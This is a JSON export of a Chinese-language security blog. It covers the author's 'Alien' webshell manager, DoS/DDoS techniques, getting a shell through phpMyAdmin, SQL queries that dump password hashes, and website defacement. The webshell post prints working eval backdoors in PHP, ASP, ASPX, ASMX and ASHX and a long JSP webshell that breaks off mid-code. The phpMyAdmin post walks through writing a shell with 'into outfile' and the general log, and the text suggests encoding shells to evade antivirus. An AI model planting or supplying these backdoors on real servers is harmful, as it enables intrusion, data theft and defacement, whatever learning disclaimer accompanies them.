{"meta":{"title":"ISSAC's blog","subtitle":"CyberSecurity blog","description":"Look behind you...","author":"ISSAC","url":"http://example.com"},"pages":[{"title":"BlackHat","date":"2023-06-06T09:14:25.000Z","updated":"2023-06-06T09:14:25.755Z","comments":true,"path":"BlackHat/index.html","permalink":"http://example.com/BlackHat/index.html","excerpt":"","text":""},{"title":"Alien Database","date":"2023-06-05T14:00:23.000Z","updated":"2023-06-12T03:07:36.240Z","comments":true,"path":"Alien/database.html","permalink":"http://example.com/Alien/database.html","excerpt":"","text":"介紹Database的管理功能目前4.0只能讀不能寫，不過最近在寫最近的5.0打算加上寫的功能，還有一開始4.0寫得太趕了，BUG都沒有修好。 DB MySQL : php SQL Server : asp, aspx, asmx, ashx 功能Information Management SQL Shell PS : 圖片中的 Priviledge Exploit 那個還沒寫，4.0還沒有。"},{"title":"Alien FileManager","date":"2023-06-05T14:00:23.000Z","updated":"2023-06-11T18:15:20.370Z","comments":true,"path":"Alien/filemanager.html","permalink":"http://example.com/Alien/filemanager.html","excerpt":"","text":"介紹主要的File Manager介面參考了Hatchet的UI，有以下功能 : FileManager Basic(基本的讀寫增刪、上傳、下載、WGET) 看圖片(這是以往的工具沒有的功能, 如果伺服器內有身份證之類的圖片就可以證明漏洞的問題) ShortCut : 上方的ToolStrip FastDir : 會掃瞄指定的dir，如果有那就加到TreeView，只要點一下就可以快速打開 Other : 顯示其他資料 Search File掃描指定的檔案名，可自定掃瞄模式。 Priviledge掃播指定Directory和SubDirectory，列出讀寫權限 Logs把進行過的操作記下，可保存 看圖片功能某些情況下Folder內有上千張圖片，這種情況有可能是個人資料，可以使用該功能打開選中圖片，也可以一次打開當前dir下的所有Image檔。如果是前者那圖片會在不同分頁開啟，如果是後者那所有圖片都會在同一個分頁內雙撃分頁內任一張的圖片可以在新分頁打開。以分頁打開的圖片可以改SizeMode，有以下5種 : AutoSize : 自動調整大小 CenterImage : Normal ScretchImage Zoom 由於可能會有很多圖片，所以可以設定Thread。 PS: 作者曾經沒有寫Thread功能，然後10張圖片直接卡死，而FastDir是把所有Directory都一次掃瞄，這是我目前測試後認為最好的做法，如果讀者有更好的方法歡迎提交issues。"},{"title":"Alien Monitor","date":"2023-06-12T14:00:23.000Z","updated":"2023-06-12T03:16:29.844Z","comments":true,"path":"Alien/monitor.html","permalink":"http://example.com/Alien/monitor.html","excerpt":"","text":"介紹娛樂功能，實際在滲透測試中不見得會有用，只是證明了Webshell可以Screenshot的可行性。 Screenshot"},{"title":"Alien","date":"2023-06-05T14:00:23.000Z","updated":"2023-06-12T03:51:35.568Z","comments":true,"path":"Alien/index.html","permalink":"http://example.com/Alien/index.html","excerpt":"","text":"Alien簡介Alien是一句話木馬管理工具，可以用在滲透測試和網站的管理。 聲明工具只限用於滲透測試和學習用途，請勿違法使用。 運行平台Windows需要安裝.NET Framework 使用說明 ID 主題 Url 1 System Information https://malbuffer4pt.github.io/Alien/systeminfo 2 File Manager https://malbuffer4pt.github.io/Alien/filemanager 3 Virtual Terminal https://malbuffer4pt.github.io/Alien/terminal 4 Database https://malbuffer4pt.github.io/Alien/database 5 Monitor https://malbuffer4pt.github.io/Alien/monitor 6 RegEdit https://malbuffer4pt.github.io/Alien/regedit"},{"title":"Alien RegEdit","date":"2023-06-12T02:00:23.000Z","updated":"2023-06-12T03:16:38.046Z","comments":true,"path":"Alien/regedit.html","permalink":"http://example.com/Alien/regedit.html","excerpt":"","text":"RegEdit跟Windows上的RegEdit差不多 Screenshot"},{"title":"Alien Virtual Terminal","date":"2023-06-05T14:00:23.000Z","updated":"2023-06-12T03:47:03.169Z","comments":true,"path":"Alien/terminal.html","permalink":"http://example.com/Alien/terminal.html","excerpt":"","text":"介紹虛擬终端，這個應該沒甚麼好介紹。 注意這是虛擬终端，不是真的终端，不能進入Interactive Shell，也就是說如果你打ssh那會直接卡死。之後考慮再寫一個能Interactive Shell的功能(目前有大概想法)。 Screenshot"},{"title":"【Tool】Alien","date":"2023-06-05T17:33:04.000Z","updated":"2023-06-11T13:00:52.857Z","comments":true,"path":"Tools/【Tool】Alien.html","permalink":"http://example.com/Tools/%E3%80%90Tool%E3%80%91Alien.html","excerpt":"","text":""},{"title":"Tools","date":"2023-06-05T14:00:39.000Z","updated":"2023-06-05T14:00:40.479Z","comments":true,"path":"Tools/index.html","permalink":"http://example.com/Tools/index.html","excerpt":"","text":""},{"title":"Alien System Information","date":"2023-06-05T14:00:23.000Z","updated":"2023-06-12T03:40:32.518Z","comments":true,"path":"Alien/systeminfo.html","permalink":"http://example.com/Alien/systeminfo.html","excerpt":"","text":"介紹介面參考了大灰狼遠控，可以獲得伺服器的資訊，有以下7個 : ID 主題 功能 1 System 伺服器基本資訊和HTTP資訊 2 Process 伺服器目前所有運行程式 3 Service 伺服器所有服務 4 Connection 列出所有連接IP 5 Window 取得打開 WinForm的Title 6 User 取得伺服器所有使用者和使用者資訊 7 Port Scan 端口掃瞄 System Process Service Connection Window User Port Scan"},{"title":"Code","date":"2023-06-05T14:24:54.000Z","updated":"2023-06-12T07:55:45.171Z","comments":true,"path":"Code/index.html","permalink":"http://example.com/Code/index.html","excerpt":"","text":"介紹寫一些和程式有關的文章"},{"title":"【Tool】SiteHunter","date":"2023-06-05T17:33:28.000Z","updated":"2023-06-11T13:00:52.866Z","comments":true,"path":"Tools/【Tool】SiteHunter.html","permalink":"http://example.com/Tools/%E3%80%90Tool%E3%80%91SiteHunter.html","excerpt":"","text":""},{"title":"Nonsense","date":"2023-06-11T17:12:23.000Z","updated":"2023-06-12T07:54:19.976Z","comments":true,"path":"Nonsense/index.html","permalink":"http://example.com/Nonsense/index.html","excerpt":"","text":"介紹用來寫廢文，可能跟技術沒有甚麼關係的文章。"},{"title":"tags","date":"2023-06-05T13:59:25.000Z","updated":"2023-06-05T14:45:50.980Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2023-06-05T13:59:43.000Z","updated":"2023-06-05T14:31:06.800Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"PenTest","date":"2023-06-12T07:50:56.000Z","updated":"2023-06-12T07:53:23.071Z","comments":true,"path":"PenTest/index.html","permalink":"http://example.com/PenTest/index.html","excerpt":"","text":"介紹用來寫一些滲透測試相關的文章，寫了就會貼在這。"}],"posts":[{"title":"【Nonsense】資安圈 = 娛樂圈 ? 對資安圈現在的想法","slug":"【Nonsense】hack-entertain","date":"2023-06-12T08:06:38.000Z","updated":"2023-06-12T16:11:12.413Z","comments":true,"path":"2023/06/12/【Nonsense】hack-entertain/","link":"","permalink":"http://example.com/2023/06/12/%E3%80%90Nonsense%E3%80%91hack-entertain/","excerpt":"","text":"前言一直以來黑&#x2F;駭客(本文用黑客一詞)給人的感覺都是很神秘和很帥，在很多電影中黑客給一種就是救埸王的感覺，小事就是入侵手機，大事就是入侵衛星。但真的是這樣嗎 ?我在資安這圈子時間也不算短了，打算分享一下我的想法。 技術的發展從古到今一直都有出現很多很令人興奮的新技術，這些技術不管是在文化還是科技上都把文明的時鐘推前了一大步，這些技術發展到今都有有些共同的特徵，會出現現狂熱朝，大家都在討論這種技術，當技術慢慢地成熟時，技術的細節已經不是大眾能理解的了，而是由幾個這方面領域的專家開拓的。那技術成熟之後呢 ? 當大家都可以接觸到這種技術的表面時，就會出現很奇怪的現像，大家都想分高下，看看誰能了解得更多，每當有人對這件事進行提問題，大家都會爭先恐後地發表自己所知道的。 對黑客的印象現實大眾對黑客的印象大眾對黑客的印象大概就是「天才」之類的。 動漫中的黑客全是美少女，帥哥 電影中的黑客全是帥哥美女， 現實中的黑帽黑客做不好就等死吧。 媒體的渲染媒體很喜歡把少年黑客叫做「天才」「最強」 資安VS畫畫在美術領域中從來不乏年輕而且畫畫很漂亮的人，在資安領域也是一樣，但是可以被同行稱為高手或大師的人又有多少個 ?我以前也有做過類似的事，可是後來我覺得這是很愚蠢的行為。 黑客甚麼都能黑?這是很大的誤會，以iphone為例子，雖然一直有一個說法是iphone有國家的後門存在，但要破解Iphone這種手機對大部分黑客(白帽+黑帽)都絕對不是甚麼容易的事，本文中第一部份說到入侵手機是一事「小事」，如果你指的入侵是任何一個人的手機只要有打開就能入侵的話，那這絕對不是甚麼小事。有很多人一聽到黑客這兩個事就會問他「你能幫我破解FB嗎 ?」大概在大眾的眼中破解一個帳號是一件很容易的事。漏洞找不到就是找不到，就像100%的HTML網頁，只有hello world的程式你要資安人士在這找出漏洞，他大概只會想打你。 找漏洞是很有趣的事 ?能找到漏洞然後寫出Exploit或者POC當然有趣，那要是找不到呢 ?相信有滲透相關經驗的人都體驗過那種坐在電腦前甚麼都找不到的感想，然後還是寫一個簡單的reflect xss在報告上。 實力上的比較比較的意義全心全意討論技術的人可以說是越來越少了，很多人學了資安相關的技術就要馬上告訴全世界自己是黑客，能得到身邊同年齡人的認可的確很重要，但絕對不是用這種方法。 領域的比較一直有人覺得黑客有所謂的最強，首先資訊安全是一個很大的領域，密碼破解、滲透測試、緩衝區溢位、物聯網安全、大規模監控、大規模掃瞄、數據修改、黑帽SEO等等…不同領域的實力強弱比較是沒有太大意義的，就好像要在跑步和跳高兩個領域進行比較並不合理一樣。如果要比較，那就應該是對社會XXX或者年薪等等有共通點的比較。 Bug Bounty計劃Bug Bounty的確是一個能看排名的計劃，2016年大陸的烏雲網還沒關閉時就有一個長期在榜一的大哥，叫做豬豬俠(曾發現阿里巴巴，百度等等存在高危漏洞)，Bug Bounty的漏洞是會以分數進行計算的，如此一看那的確是可以在滲透方面分出高下。 工具編寫寫工具也是一個很多比較的方法，總會有人因為寫出很有名和很好用的工具而成名 黑客與英雄主義資安領域也有著英雄主義，會有黑客因為做出某件事而被大眾稱為英雄， 1OpenBSD crowd is a bunch of masturbating monkeys — Linus 這句話是Linux之父Linus罵OpenBSD的話，因為Linus認為軟體的bug比安全漏洞還要多，而資安人士因為找到漏洞成為因為但忽略了一般bug的問題。","categories":[{"name":"Nonsense","slug":"Nonsense","permalink":"http://example.com/categories/Nonsense/"}],"tags":[{"name":"nonsense","slug":"nonsense","permalink":"http://example.com/tags/nonsense/"},{"name":"thinking","slug":"thinking","permalink":"http://example.com/tags/thinking/"},{"name":"hacker","slug":"hacker","permalink":"http://example.com/tags/hacker/"}],"keywords":[{"name":"Nonsense","slug":"Nonsense","permalink":"http://example.com/categories/Nonsense/"}]},{"title":"【BlackHat】DoS，DDoS與BotNet","slug":"【BlackHat】DoSandDDoS","date":"2023-06-12T08:05:35.000Z","updated":"2023-06-12T13:40:32.168Z","comments":true,"path":"2023/06/12/【BlackHat】DoSandDDoS/","link":"","permalink":"http://example.com/2023/06/12/%E3%80%90BlackHat%E3%80%91DoSandDDoS/","excerpt":"","text":"前言DoS&#x2F;DDoS應該是小學生最喜歡的東西了，很多小學生和小屁孩都喜歡把說ddos然後就會覺得自己是黑客&#x2F;駭客。(PS: 作者習慣使用黑客一詞，本文也會使用該詞)在2015-2016年左右時，台灣當時有很多人喜歡使用LOIC這種工具，然後就說自己是黑客。事實上他們那跟本就不是甚麼DDoS，只是DoS罷了，也許是說成DDoS聽上去會比較強吧。作者曾經也是那樣的人，所以我很討厭以前的自己(現在其實也差不多啦…)。DoS絕對不是甚麼好玩的東西，它的確是一種黑客會用的手段，但它也許是門檻最低的，然而正是因為門檻低，所以很多人都不願深入了解。DoS&#x2F;DDoS需然看似很簡單，但是有很大的戰略價值，本文作者就打算記錄一下自己知道的，如果有一天我忘了也可以回來看，也算是給讀者們的科普。 思考為甚麼要攻撃 ?是誰在攻撃 ?相信這都是每個網頁admin都會想過的問題，說出這方面的技術不是想讓你們去攻撃其他人，而是想讓你們知道相關原理，再進行防範。 Disclaimer本文只限用於學習用途 DoSIntroductionDoS全稱是 Denial of Server，技術上指的是發一大堆封包或Request到目標電腦上，讓目標因為過大的負荷而停止服務。DDoS多了一個 D ()所以本文會把 DDoS&#x2F;DoS的大部份技術都放在DoS上,而DDoS就會和BotNet一起討論 舊時代的DoSPing of Death以前的電腦無法處理大於IPv4最大的封包大小(65535 bytes)的ping封包，在目標接收到該封包後電腦會Crash掉 TearDrop發送損壞的封包，癱瘓系統。 以上兩種在現代基本已經過時，以下是目前主流的攻撃方式 現代常用的DoS技巧攻撃BandWidth ICMP&#x2F;IGMP UDP Flood 反射+放大攻撃Introduction英文是DRDoS(Distributed Reflection Denial of Service),某些網路服務對於Request和Response之間長度大小的不一致，如果這時source IP可被偽造，那這個很大的Response就會直接發到受害者的電腦上，還可以隱藏攻撃者的IP。 Method ACK Reflect DNS Reflect NTP Reflect SNMP 系統資源消耗Method TCP Flood SYN Flood PSH + ACK RST Flood Sockstress 誤區DDoS&#x2F;DoS不全是Flood，的確目前大部份都是Flood，但也有所謂的 Low and Slow Attack SSL攻撃IntroductionSSL : Secure Sockets Layer Method THC SSL DoS SSL Flood 攻撃應用資源Method DNS Query Flood DNS NXDomain Web攻撃Method HTTP Flood Slowloris POST ReDoS 漏洞型DoS找出網頁漏洞，該漏洞可把網頁直接卡死。 Minecraft中的DoS普通DoS如上 BOT發出特點的JSON封包到伺服器，該JSON封包在伺服器內構成虛擬玩家，達到伺服器最大人數時就會阻止其他正常玩定進入。同時虛擬玩家也可以進行無意義的洗版，進一步加重伺服器的負擔。 現代DoS常用的工具綜合工具 Hping PenTBox Zarp 壓力測試壓力測試(StressTest)即合法的用DoS攻撃網站 LOIC HOIC HULK Pro Slowloris RUDY THC SSL DOS DDoS &amp; BotNetIntroductionDDoS就是比DoS多了一個D(Distributed) TheoryBotNet技術目前BotNet的主要技術有四個 IRC TCP Server &amp; Client HTTP P2P 自願型BotNetBotNet可以用漏洞來「抓雞」，在受害者非自願的情況下進行攻撃，而自願型BotNet就是每個人都對目標發動DoS攻撃，很有名的Anonymous在過去就是這樣做的，每個成員都使用LOIC去攻撃。 DDoS的戰術價值1.2. 用DDoS吸引人的注意，等企業內部人力資源集中在處理DDoS時，很有可能會被其他攻撃者以入侵的方式攻撃伺服器。歷史上真有其事，具體可參考「 DDoS在黑色產業上的應用DDoS不止可以用來搞事情，還可以轉化為錢 : 競爭為了打撃對手而進行DDoS 勒索中小型公句和企業一般不具備防DDoS的技術，而專業的防DDoS又需要錢。攻撃者往往會把價錢定在一個「合適」的數字，讓受害者就範。 報復攻撃者們會利用個人要報復而去攻撃的情緒，提出DDoS的服務 DDoS的防範Introduction目前沒有一個完美的技術可以防DDoS，因為DDoS本來就是因為網路設計上的問題所導致的，但是有緩解和治理的方法。 BotNet的打撃對BotNet的處理在現實中是很困難的事，因為數量太多而且分散在不同地方。但目前也有幾種可行的方法 : 針對BotNet本身 Reverse Engineering : 取得樣本後把病毒特徵加到防毒軟體上，直接對成千上萬用戶檢查。 接管或者摧毀BotNet : 很難的做法，一般需要政府間的合作，只有實力強大的跨國公司才可以做到，歷史上成功的例子就是Microsoft對Nitol的摧毀。 直接封IP在以前中國GWF曾經因為技術上的問題而對國外做出疑似DDoS的行為，當時有幾個國家馬上封鎖中國的IP，當然了這招在現實中的中小企業不現實，除非攻撃者是使用DoS。 針對Fake IP可以參考 CERT和IETF的方法 CERT Advisory CA-1996-21 RFC 2827 Unicast Reverse Path Forwarding 流量的稀釋 CDN Anycast 誤區 防火牆可以防DDoS ?這是很大的誤會，強悍的DDoS反而會影響防火牆的運作效率。 買更好的BandWidth好的BandWidth要更多的錢，而DDoS流量是用GB計算了，沒有太大的用處。","categories":[],"tags":[{"name":"BlackHat","slug":"BlackHat","permalink":"http://example.com/tags/BlackHat/"},{"name":"ddos","slug":"ddos","permalink":"http://example.com/tags/ddos/"},{"name":"dos","slug":"dos","permalink":"http://example.com/tags/dos/"}],"keywords":[]},{"title":"【Tech】[PenTest] phpMyAdmin的getshell方法","slug":"【Tech】-PenTest-phpmyadmingetshell","date":"2023-06-12T08:03:06.000Z","updated":"2023-06-12T13:12:07.042Z","comments":true,"path":"2023/06/12/【Tech】-PenTest-phpmyadmingetshell/","link":"","permalink":"http://example.com/2023/06/12/%E3%80%90Tech%E3%80%91-PenTest-phpmyadmingetshell/","excerpt":"","text":"前言在滲透測試中有時可以運氣行好直接登入到phpMyAdmin，下一步我們可以透過getshell進行更深入的滲透，例如像域滲透這種。 環境 Windows 11 Apache + php8.2 phpMyAdmin 前提需要以下條件 phpMyAdmin最好是root帳號 知道Absolute Path (本文使用 D:&#x2F;xampp&#x2F;htdocs) 實戰Geshell方法phpMyAdmin getshell一般有兩種方法 : SQL getshell 後端 getshell 第一種是使用SQL把webshell寫到伺服器上，第二種是改後端密碼上傳webshell。 SQL getshell常用方法 - 使用 select into outfile這應該是最常用的方法了，在知道路徑的情況下可以用這招 12select load_file(&#x27;D:/xampp/htdocs&#x27;);select &#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;D:/xampp/htdocs&#x27;; 這是最簡單的方法，也是很容易失敗的方法，大部份網頁admin都不是傻的，他們會有設定檔案權限，此時執行 1SHOW VARIABLES LIKE &quot;secure_file_priv&quot;; Value一般會有兩種結果 Folder路徑 : 代表只有該路徑才可以修改 NULL : 禁止修改 Log寫shellMySQL 5.0以上會自動寫Logs，把執行過的SQL指令都寫進一個.log檔，那如果此時的檔案不是.log而是.php呢? 執行以下指令 1SHOW VARIABLES LIKE &#x27;general%&#x27;; 12set global general_log = &quot;ON&quot;;set global general_log_file=&quot;D:/xampp/htdocs/shell.php&quot;; 技巧最簡單的php一句話木馬 1&lt;?php phpinfo(); ?&gt; 也是最容易被防毒查出來的，如果webshell的code寫得比較多可以把webshell base64加密，再使用php的 base64_decode(); 函數解密。 後話Log寫webshell的方法動作會很大的，會很容易被發現。另外記得要把一開始的.log檔案記下，不然你會無法還原。","categories":[],"tags":[],"keywords":[]},{"title":"【Tech】[SQL]SQL注入取得使用者帳號密碼的方法","slug":"【Tech】-SQL-SQL注入取得使用者帳號密碼的方法","date":"2023-06-12T08:00:40.000Z","updated":"2023-06-12T13:14:36.433Z","comments":true,"path":"2023/06/12/【Tech】-SQL-SQL注入取得使用者帳號密碼的方法/","link":"","permalink":"http://example.com/2023/06/12/%E3%80%90Tech%E3%80%91-SQL-SQL%E6%B3%A8%E5%85%A5%E5%8F%96%E5%BE%97%E4%BD%BF%E7%94%A8%E8%80%85%E5%B8%B3%E8%99%9F%E5%AF%86%E7%A2%BC%E7%9A%84%E6%96%B9%E6%B3%95/","excerpt":"","text":"前言記錄幾個在sql注入中可以把database user, password拿出來的方法 SQLMap1sqlmap.py -u xxx --passwords SQL Query12345//MySQLselect host,user,password from mysql.user;//SQL Server 2022SELECT name, CONVERT(varchar(max), password_hash, 1) AS hashed_password FROM sys.sql_logins","categories":[],"tags":[],"keywords":[]},{"title":"【Tech】掛黑頁","slug":"【Tech】掛黑頁","date":"2023-06-05T17:39:12.000Z","updated":"2023-06-11T13:00:52.852Z","comments":true,"path":"2023/06/06/【Tech】掛黑頁/","link":"","permalink":"http://example.com/2023/06/06/%E3%80%90Tech%E3%80%91%E6%8E%9B%E9%BB%91%E9%A0%81/","excerpt":"","text":"介紹黑頁, 英文是 Deface Page, 指的是在入侵網站後直接把網站的 home page 改為自己的內容,一般都是用作惡意破壞或政治目的 : 在十多年前的中國，當時對網路犯罪的打撃沒有很重，他們自己開發的CMS又有很多漏洞，很容易就會被Getshell，做成以前很長的一段時間都有網站不斷地被掛黑頁，甚至還會在黑頁上寫上自己的QQ號碼。 在國際上比較有名的事件 : Iranian Cyber Army 掛黑頁從技術上來說，制作黑頁並不難，只要會寫HTML就可以了，難的時要怎麼樣掛黑頁，目前來說掛黑頁的方式主要有兩種 Getshell : 用Webshell直接修改 index.html 的HTML, 在無法getshell的情況下有的會直接在後端改圖片 DNS修改 : 把目標DNS改為自己的伺服器IP, 例如Iranian Cyber Army用的就是這種，還有美國政府也是，附圖如下 US","categories":[{"name":"BlackHat","slug":"BlackHat","permalink":"http://example.com/categories/BlackHat/"}],"tags":[{"name":"code","slug":"code","permalink":"http://example.com/tags/code/"},{"name":"html","slug":"html","permalink":"http://example.com/tags/html/"},{"name":"blackhat","slug":"blackhat","permalink":"http://example.com/tags/blackhat/"},{"name":"deface page","slug":"deface-page","permalink":"http://example.com/tags/deface-page/"}],"keywords":[{"name":"BlackHat","slug":"BlackHat","permalink":"http://example.com/categories/BlackHat/"}]},{"title":"【Tool】SiteHunter","slug":"【Tool】SiteHunter","date":"2023-06-05T17:33:28.000Z","updated":"2023-06-12T03:29:32.291Z","comments":true,"path":"2023/06/06/【Tool】SiteHunter/","link":"","permalink":"http://example.com/2023/06/06/%E3%80%90Tool%E3%80%91SiteHunter/","excerpt":"","text":"簡介SiteHunter是一個用C#編寫的網站掃瞄工具，功能如下 : C段掃瞄 目錄掃瞄 子域名爆破 Url Collector GitHubhttps://github.com/malbuffer4pt/SiteHunter Screenshot","categories":[{"name":"Tools","slug":"Tools","permalink":"http://example.com/categories/Tools/"}],"tags":[{"name":"pentest","slug":"pentest","permalink":"http://example.com/tags/pentest/"},{"name":"工具","slug":"工具","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7/"},{"name":"SiteHunter","slug":"SiteHunter","permalink":"http://example.com/tags/SiteHunter/"},{"name":"Information","slug":"Information","permalink":"http://example.com/tags/Information/"},{"name":"Scan","slug":"Scan","permalink":"http://example.com/tags/Scan/"},{"name":"C段掃瞄","slug":"C段掃瞄","permalink":"http://example.com/tags/C%E6%AE%B5%E6%8E%83%E7%9E%84/"},{"name":"旁注","slug":"旁注","permalink":"http://example.com/tags/%E6%97%81%E6%B3%A8/"},{"name":"子域名","slug":"子域名","permalink":"http://example.com/tags/%E5%AD%90%E5%9F%9F%E5%90%8D/"},{"name":"目錄爆破","slug":"目錄爆破","permalink":"http://example.com/tags/%E7%9B%AE%E9%8C%84%E7%88%86%E7%A0%B4/"}],"keywords":[{"name":"Tools","slug":"Tools","permalink":"http://example.com/categories/Tools/"}]},{"title":"【Tool】Alien","slug":"【Tool】Alien","date":"2023-06-05T17:33:04.000Z","updated":"2023-06-11T17:04:44.957Z","comments":true,"path":"2023/06/06/【Tool】Alien/","link":"","permalink":"http://example.com/2023/06/06/%E3%80%90Tool%E3%80%91Alien/","excerpt":"","text":"簡介Alien是一個用C#編寫的一句話木馬管理工具，功能如下 : System Information FileManager (可顯示圖片) Virtual Terminal Database Registry Monitor Screenshot 可控伺服器(可使用功能不一致)Windows&#x2F;Linux&#x2F;Unix&#x2F;MacOS Database MySQL : PHP SQL Server : ASP, ASPX, ASMX, ASHX 文檔&amp;下載 ID 主題 Url 1 Alien文檔 https://malbuffer4pt.github.io/Alien 2 Alien Github https://github.com/malbuffer4pt/Alien","categories":[{"name":"Tools","slug":"Tools","permalink":"http://example.com/categories/Tools/"}],"tags":[{"name":"Alien","slug":"Alien","permalink":"http://example.com/tags/Alien/"},{"name":"webshell","slug":"webshell","permalink":"http://example.com/tags/webshell/"},{"name":"backdoor","slug":"backdoor","permalink":"http://example.com/tags/backdoor/"},{"name":"pentest","slug":"pentest","permalink":"http://example.com/tags/pentest/"},{"name":"工具","slug":"工具","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7/"}],"keywords":[{"name":"Tools","slug":"Tools","permalink":"http://example.com/categories/Tools/"}]},{"title":"【Tech】一句話木馬","slug":"【Tech】一句話木馬","date":"2023-06-05T17:04:54.000Z","updated":"2023-06-12T04:58:26.397Z","comments":true,"path":"2023/06/06/【Tech】一句話木馬/","link":"","permalink":"http://example.com/2023/06/06/%E3%80%90Tech%E3%80%91%E4%B8%80%E5%8F%A5%E8%A9%B1%E6%9C%A8%E9%A6%AC/","excerpt":"","text":"甚麼是WebShellWebShell是在滲透測試和入侵時都會用到的工具，是一種後門，需要注意的時WebShell和網頁木馬不一樣，網頁木馬是掛在正常網頁上的木馬程式，當使用者瀏覽網頁時就會下載或執行木馬。WebShell是用來控制一整個網頁伺服器的工具。WebShell有以下三種 :- 大馬 : 檔案大，30~70KB以上，加密後會超過100KB。- 小馬 : 檔案小，一般在10KB以下 - 指令執行木馬 : 只能簡單地執行的Shell Command. - 一句話木馬 : 功能可超越大馬，容易隱藏和改造。 一句話木馬在現今的入侵和滲透用的webshell基本上用的都是一句話木馬，大馬的好處是所有執行的Payload都是在localhost上進行，不使用HTTP POST，可以不考慮WAF，但因為檔案太大很容易會被發現，而且不容易寫變種。一句話木馬雖然會因為使用HTTP POST會被WAF檢查，但是很容易寫變種和隱藏，還可以直接寫在正常的檔案內。 一句話木馬客戶端指的是先把對應語言的Payload寫好，再用客戶端發起 POST Request，這樣就會非常方便在大陸以前比較有名的工具叫 中國菜刀，大陸現在比較常用的工具有三個 : 蟻劍 Godzilla 冰蝎 這邊推一下我自己寫的Alienhttps://malbuffer4pt.github.io/Alien 一句話木馬的程式在伺服器沒有裝WAF，Anti-Virus時，只需要用這不到 1KB的程式就可以控制一整台伺服器如下圖 (工具: Alien) 以php為例，PHP一句話木馬為 1&lt;?php @eval($_POST[&#x27;pass&#x27;]); ?&gt; $_POST[‘pass’] : 取得HTTP POST參數為pass的Data@eval($str); : 把 $str 以PHP Code執行 , @ 代表如果 $str &#x3D;&#x3D; null時就不顯示結果(這樣就增加了隱密性。)所以 @eval($_POST[‘pass’]); 就可以把HTTP POST的內容執行, 如 : 1pass=phpinfo(); 就可執行phphinfo(); ASP : 1&lt;% execute(request(&quot;pass&quot;)) %&gt; ASPX : 12&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;])%&gt; 關於ASMX, ASHX, CFM, JSP, JSPX和NodeJS木馬它們的特點都是沒有「好用」(對攻撃者而言)的eval()函數，或者使用上會比較麻煩…ASMX和ASHX是我在Freebuf上找到的，作者是Ivan，這也有寫進Alien內。而CFM是一個很老的東西了… ASMX123456789101112131415161718&lt;%@ WebService Language=&quot;JScript&quot; class=&quot;ScriptMethodSpy&quot;%&gt;import System;import System.Web;import System.IO;import System.Web.Servicesimport System.Web.Script.Servicespublic class ScriptMethodSpy extends WebService&#123; WebMethodAttribute ScriptMethodAttribute function Invoke(Ivan : String) : Void &#123; var I = HttpContext.Current; var Request = I.Request; var Response = I.Response; var Server = I.Server; Response.Write(&quot;&lt;H1&gt;Just for Research Learning, Do Not Abuse It! Written By &lt;a href=&#x27;https://github.com/Ivan1ee&#x27;&gt;Ivan1ee&lt;/a&gt;&lt;/H1&gt;&quot;); eval(Ivan); &#125;&#125; ASHX12345678910111213&lt;%@ WebHandler Language=&quot;JScript&quot;class=&quot; HandlerSpy &quot;%&gt;import System;import System.Web;import System.IO;public class HandlerSpy implements IHttpHandler&#123; function IHttpHandler.ProcessRequest(context : HttpContext)&#123; context.Response.Write(&quot;&lt;H1&gt;Just for fun, Do not abuse it!Written by &lt;ahref=&#x27;https://github.com/Ivan1ee&#x27;&gt;Ivan1ee&lt;/a&gt;&lt;/H1&gt; &quot;); eval(context.Request[&quot;Ivan&quot;]); &#125; function get IHttpHandler.IsReusable() : Boolean&#123; return false; &#125;&#125; JSPJSP目前主要有兩種，菜刀形和冰蝎形菜刀形 : 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;%@page import=&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;%&gt;&lt;%!String Pwd=&quot;sky&quot;;String EC(String s,String c)throws Exception&#123;return s;&#125;//new String(s.getBytes(&quot;ISO-8859-1&quot;),c);&#125;Connection GC(String s)throws Exception&#123;String[] x=s.trim().split(&quot;\\r\\n&quot;);Class.forName(x[0].trim()).newInstance();Connection c=DriverManager.getConnection(x[1].trim());if(x.length&gt;2)&#123;c.setCatalog(x[2].trim());&#125;return c;&#125;void AA(StringBuffer sb)throws Exception&#123;File r[]=File.listRoots();for(int i=0;i&lt;r.length;i++)&#123;sb.append(r[i].toString().substring(0,2));&#125;&#125;void BB(String s,StringBuffer sb)throws Exception&#123;File oF=new File(s),l[]=oF.listFiles();String sT, sQ,sF=&quot;&quot;;java.util.Date dt;SimpleDateFormat fm=new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);for(int i=0;i&lt;l.length;i++)&#123;dt=new java.util.Date(l[i].lastModified());sT=fm.format(dt);sQ=l[i].canRead()?&quot;R&quot;:&quot;&quot;;sQ+=l[i].canWrite()?&quot; W&quot;:&quot;&quot;;if(l[i].isDirectory())&#123;sb.append(l[i].getName()+&quot;/\\t&quot;+sT+&quot;\\t&quot;+l[i].length()+&quot;\\t&quot;+sQ+&quot;\\n&quot;);&#125;else&#123;sF+=l[i].getName()+&quot;\\t&quot;+sT+&quot;\\t&quot;+l[i].length()+&quot;\\t&quot;+sQ+&quot;\\n&quot;;&#125;&#125;sb.append(sF);&#125;void EE(String s)throws Exception&#123;File f=new File(s);if(f.isDirectory())&#123;File x[]=f.listFiles();for(int k=0;k&lt;x.length;k++)&#123;if(!x[k].delete())&#123;EE(x[k].getPath());&#125;&#125;&#125;f.delete();&#125;void FF(String s,HttpServletResponse r)throws Exception&#123;int n;byte[] b=new byte[512];r.reset();ServletOutputStream os=r.getOutputStream();BufferedInputStream is=new BufferedInputStream(new FileInputStream(s));os.write((&quot;-&gt;&quot;+&quot;|&quot;).getBytes(),0,3);while((n=is.read(b,0,512))!=-1)&#123;os.write(b,0,n);&#125;os.write((&quot;|&quot;+&quot;&lt;-&quot;).getBytes(),0,3);os.close();is.close();&#125;void GG(String s, String d)throws Exception&#123;String h=&quot;0123456789ABCDEF&quot;;int n;File f=new File(s);f.createNewFile();FileOutputStream os=new FileOutputStream(f);for(int i=0;i&lt;d.length();i+=2)&#123;os.write((h.indexOf(d.charAt(i))&lt;&lt;4|h.indexOf(d.charAt(i+1))));&#125;os.close();&#125;void HH(String s,String d)throws 